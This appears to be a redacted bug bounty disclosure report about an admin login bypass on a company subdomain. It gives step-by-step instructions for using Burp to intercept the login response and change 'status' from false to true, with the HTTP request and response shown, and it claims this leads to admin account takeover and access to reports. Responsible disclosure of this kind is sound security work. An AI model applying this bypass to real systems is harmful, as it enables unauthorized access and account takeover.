title: Admin Authentication Bypass Lead to Admin Account Takeover
vulnerability_information:
Hello Team

I found that i can bypass the login page of the Admin account by intercepting the respone of the login request of ```â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ``` subdomain and change ```status``` from ```false``` to ```true```

## Steps To Reproduce:

  1. Open ```â–ˆâ–ˆâ–ˆâ–ˆ```
  2. Enter ```Admin``` as a Username  and ```â–ˆâ–ˆâ–ˆ``` as a password 

â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ

  3. Press log in and Intercept the request in Burp
```
POST /api/Account/Login/ HTTP/2
Host: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
Cookie: â–ˆâ–ˆâ–ˆ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 38
Origin: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"UserName":"â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ","Password":"â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ"}
```

  4. Intercept the response for this request in Burp by >> ```Do Intercept >>Response to this request``` and then Forward this request
  5. Change ```status``` value from ```false``` to ```true``` and Forward the request

```
HTTP/2 200 OK
Cache-Control: no-cache,no-cache,no-store
Pragma: no-cache,no-cache
Content-Type: application/json; charset=utf-8
Expires: -1
Server: 
X-Content-Type-Options: nosniff
X-Xss-Protection: 1; mode=block
Referrer-Policy: no-referrer
Strict-Transport-Security: max-age=31536000; includeSubDomains;preload
X-Frame-Options: DENY
X-Ua-Compatible: IE=Edge
Content-Security-Policy: script-src 'self'; object-src 'self'; frame-ancestors 'none'
Expect-Ct: enforce, max-age=7776000, report-uri='â–ˆâ–ˆâ–ˆ-Allow-Origin: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ-Allow-Headers: Accept, Content-Type, Origin
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Date: â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ GMT
Content-Length: 71

{"status":true,"errorMessage":"Username and Password does not match."}
```


  6. Now open ```Report``` , ```Change Password``` and  ```Process Return``` and then Turn off the intercept of the Burp

â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ

## Impact

The attacker can 
- login as an â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ by bypassing the authentication  
- change the â–ˆâ–ˆâ–ˆ password to takeove the â–ˆâ–ˆâ–ˆ account
- View the company's reports and delete them [1066 Report]
- View processReturn
